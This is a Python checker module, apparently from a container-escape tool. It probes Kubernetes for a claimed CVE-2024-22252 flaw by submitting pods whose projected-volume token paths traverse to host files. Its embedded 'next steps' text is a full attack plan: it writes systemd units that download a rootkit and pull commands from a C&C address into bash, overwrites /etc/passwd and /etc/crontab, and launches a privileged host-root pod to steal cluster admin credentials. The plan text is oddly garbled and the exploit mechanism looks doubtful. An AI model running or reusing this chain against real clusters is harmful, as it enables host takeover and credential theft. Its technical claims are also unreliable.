"""
Projected Volume API Checker

Checks vulnerabilities CVE-2024-22252 via projected volume API.
"""

import os
import json
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class ProjectedVolumeAPIChecker:
    """Checks CVE-2024-22252 vulnerability"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking vulnerabilities CVE-2024-22252 via projected volume API."""
        try:
            # Checking for seccomp profile
            seccomp_enabled = False
            try:
                # Checking if seccomp enabled in kernel
                sec_rc, sec_out, _ = await run_exec(['sh', '-lc', 'grep CONFIG_SECCOMP /boot/config-$(uname -r)'], timeout=5)
                if sec_rc == 0 and 'CONFIG_SECCOMP=y' in (sec_out or ""):
                    seccomp_enabled = True
            except Exception:
                pass
            
            # Checking if seccomp to current container
            if not seccomp_enabled:
                try:
                    status_file = '/proc/self/status'
                    if os.path.exists(status_file):
                        with open(status_file, 'r') as f:
                            for line in f:
                                if 'Seccomp:' in line:
                                    value = line.split(':')[1].strip()
                                    if value != '0':  # 0 means that seccomp is disabled
                                        seccomp_enabled = True
                                    break
                except Exception:
                    pass
            
            # Checking for token for access to API
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='projected_volume_api', 
                    status='not_found', 
                    message='Service account token not found.'
                )
                
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            namespace = (await asyncio.to_thread(lambda: open("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "r").read())).strip()
                
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Checking permissions on creation pods with projected volumes
            pod_spec = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {
                    "name": "projected-volume-test",
                    "namespace": namespace
                },
                "spec": {
                    "containers": [{
                        "name": "test-container",
                        "image": "busybox",
                        "command": ["sleep", "300"],
                        "volumeMounts": [{
                            "name": "projected-volume",
                            "mountPath": "/projected"
                        }]
                    }],
                    "volumes": [{
                        "name": "projected-volume",
                        "projected": {
                            "sources": [{
                                "serviceAccountToken": {
                                    "path": "token",
                                    "expirationSeconds": 3600
                                }
                            }]
                        }
                    }]
                }
            }
            
            create_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '--data', json.dumps(pod_spec)
            ]
            
            create_rc, create_out, _ = await run_exec(create_cmd, timeout=5)
            
            # Checking for vulnerability software attempting creation of projection with invalid path
            projected_volume_allowed = False
            arbitrary_file_write = False
            
            if create_rc == 0 and "Forbidden" not in (create_out or "") and "denied" not in (create_out or "").lower():
                projected_volume_allowed = True
                
                # Removing test pod
                delete_cmd = [
                    'curl', '-s', '-X', 'DELETE',
                    f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods/projected-volume-test',
                    '--header', f'Authorization: Bearer {token}',
                    '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
                ]
                
                await run_exec(delete_cmd, timeout=5)
                
                # Checking possibility of writing to arbitrary file via absolute path (CVE-2024-22252)
                malicious_pod_spec = {
                    "apiVersion": "v1",
                    "kind": "Pod",
                    "metadata": {
                        "name": "cve-2024-22252-test",
                        "namespace": namespace
                    },
                    "spec": {
                        "containers": [{
                            "name": "test-container",
                            "image": "busybox",
                            "command": ["sleep", "300"],
                            "volumeMounts": [{
                                "name": "projected-volume",
                                "mountPath": "/projected"
                            }]
                        }],
                        "volumes": [{
                            "name": "projected-volume",
                            "projected": {
                                "sources": [{
                                    "serviceAccountToken": {
                                        "path": "../../../../etc/systemd/system/evil-service.service",
                                        "expirationSeconds": 3600
                                    }
                                }]
                            }
                        }]
                    }
                }
                
                create_malicious_cmd = [
                    'curl', '-s', '-X', 'POST',
                    f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods',
                    '--header', f'Authorization: Bearer {token}',
                    '--header', 'Content-Type: application/json',
                    '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                    '--data', json.dumps(malicious_pod_spec)
                ]
                
                mal_rc, mal_out, _ = await run_exec(create_malicious_cmd, timeout=5)
                
                if mal_rc == 0 and "Forbidden" not in (mal_out or "") and "denied" not in (mal_out or "").lower():
                    arbitrary_file_write = True
                    
                    # Removing test pod
                    delete_malicious_cmd = [
                        'curl', '-s', '-X', 'DELETE',
                        f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods/cve-2024-22252-test',
                        '--header', f'Authorization: Bearer {token}',
                        '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
                    ]
                    
                    await run_exec(delete_malicious_cmd, timeout=5)
            
            if arbitrary_file_write and not seccomp_enabled:
                demo_next = """detected critsical vulnerabilitsy CVE-2024-22252 In Kubernetes API! This vulnerabilitsy allows performIng arbitsrary writses files on host via Projected Volume API. Seccomp not configured properly , that makIng system fully vulnerable. Here is detailed plan exploitsation:

1. CreatIng malicious pod witsh projected volume, poIntIng on file In host filesystem:
   ```
   cat > /tmp/malicious-pod.yaml << 'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: arbitrary-file-write-pod
     namespace: default
   spec:
     containers:
     - name: exploit-container
       image: busybox
       command: ["sleep", "infinity"]
       volumeMounts:
       - name: exploit-volume
         mountPath: /exploit
     volumes:
     - name: exploit-volume
       projected:
         sources:
         - serviceAccountToken:
             path: "../../../../etc/systemd/system/kernel-monitor.service"
             expirationSeconds: 99999999
   EOF
   
   kubectl apply -f /tmp/malicious-pod.yaml
   ```

2. systemd service file will be created witsh content service, but need this substitsute own content:
   ```
   # Creating content for malicious systemd service
   cat > /tmp/evil-service.service << 'EOF'
   [Unit]
   Description=Kernel Monitor Service
   After=network.target
   
   [Service]
   Type=oneshot
   ExecStart=/bin/bash -c 'echo "#!/bin/bash" > /tmp/rootkit.sh && echo "mkdir -p /tmp/.hidden" >> /tmp/rootkit.sh && echo "curl -s http://198.51.100.10/rootkit -o /tmp/.hidden/rootkit" >> /tmp/rootkit.sh && echo "/tmp/.hidden/rootkit &" >> /tmp/rootkit.sh && chmod +x /tmp/rootkit.sh && /tmp/rootkit.sh'
   
   [Install]
   WantedBy=multi-user.target
   EOF
   ```

3. More dangerous variant use vulnerabilitsies - overwritse password or shadow file:
   ```
   # Creating Pod with projection to passwd file for adding root user
   cat > /tmp/passwd-pod.yaml << 'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: passwd-exploit-pod
     namespace: default
   spec:
     containers:
     - name: passwd-container
       image: busybox
       command: ["sleep", "infinity"]
       volumeMounts:
       - name: passwd-volume
         mountPath: /passwd
     volumes:
     - name: passwd-volume
       projected:
         sources:
         - serviceAccountToken:
             path: "../../../../etc/passwd"
             expirationSeconds: 99999999
   EOF
   
   kubectl apply -f /tmp/passwd-pod.yaml
   ```

4. Creating pod with projection to /etc/crontab for installing persistent presence:
   ```
   cat > /tmp/crontab-pod.yaml << 'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: crontab-exploit-pod
     namespace: default
   spec:
     containers:
     - name: crontab-container
       image: busybox
       command: ["sleep", "infinity"]
       volumeMounts:
       - name: crontab-volume
         mountPath: /crontab
     volumes:
     - name: crontab-volume
       projected:
         sources:
         - serviceAccountToken:
             path: "../../../../etc/crontab"
             expirationSeconds: 99999999
   EOF
   
   kubectl apply -f /tmp/crontab-pod.yaml
   ```

5. Preparation more sophisticated exploits - creation reverse shell via systemd:
   ```
   # Creating Pod with projection to systemd service
   cat > /tmp/reverse-shell-pod.yaml << 'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: shell-exploit-pod
     namespace: default
   spec:
     containers:
     - name: shell-container
       image: busybox
       command: ["sleep", "infinity"]
       volumeMounts:
       - name: shell-volume
         mountPath: /shell
     volumes:
     - name: shell-volume
       projected:
         sources:
         - serviceAccountToken:
             path: "../../../../etc/systemd/system/node-monitor.service"
             expirationSeconds: 99999999
   EOF
   ```

6. ActivatIng systemd service for obtaInIng comms from C&C server:
   ```
   # Replacing service content with malicious one
   kubectl exec shell-exploit-pod -- sh -c 'echo "[Unit]
   Description=Node Health Monitoring Service
   After=network.target
   
   [Service]
   ExecStart=/bin/bash -c \\'while true; do curl -s http://198.51.100.10/cmd | bash -s; sleep 60; done\\'
   Restart=always
   
   [Install]
   WantedBy=multi-user.target" > /shell/node-monitor.service'
   
   # Activating service via vulnerability execution commands on node
   kubectl exec shell-exploit-pod -- sh -c 'echo "#!/bin/bash
   systemctl daemon-reload
   systemctl enable node-monitor.service
   systemctl start node-monitor.service" > /shell/activate.sh && chmod +x /shell/activate.sh && /shell/activate.sh'
   ```

7. Exploiting vulnerability for creation privileged pod with access to root file system host:
   ```
   cat > /tmp/priv-pod.yaml << 'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: privileged-pod
     namespace: kube-system
   spec:
     hostPID: true
     hostNetwork: true
     containers:
     - name: privileged-container
       image: alpine
       command: ["sh", "-c", "apk add --no-cache bash && while true; do sleep 3600; done"]
       securityContext:
         privileged: true
       volumeMounts:
       - name: host-root
         mountPath: /host-root
     volumes:
     - name: host-root
       hostPath:
         path: /
   EOF
   
   kubectl apply -f /tmp/priv-pod.yaml
   ```

8. Getting reverse shell and full Access to host system:
   ```
   kubectl exec -it privileged-pod -n kube-system -- bash
   
   # Inside privileged pod
   chroot /host-root /bin/bash
   
   # Now I have full access to host system as root
   id
   hostname
   # Getting access to configuration cluster
   cat /etc/kubernetes/admin.conf
   ```

            Through exploitation of vulnerabilities CVE-2024-22252 I can bypass container isolation, get rights for writing arbitrary files in host system and execute arbitrary code on host. In final result, this gives possibility of full compromise of both separate node, and entire cluster Kubernetes, including obtaining administrator credentials of cluster."""

                return EscapeAttemptResult(
                    method='projected_volume_api', 
                    status='exploited', 
                    message='detected critical vulnerability CVE-2024-22252: possibility of arbitrary file writing on host via Projected Volume API. Seccomp not configured, system fully vulnerable.',
                    demo_next_steps=demo_next
                )
            
            if projected_volume_allowed:
                return EscapeAttemptResult(
                    method='projected_volume_api', 
                    status='suspicious', 
                    message='Projected Volume API allowed, but full exploitation CVE-2024-22252 failed. Possibly, this is related to seccomp settings or patch.'
                )
                
            return EscapeAttemptResult(
                method='projected_volume_api', 
                status='not_vulnerable', 
                message='Projected Volume API either disabled, or access to it limited. System not vulnerable to CVE-2024-22252.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='projected_volume_api', status='error', message=str(e))

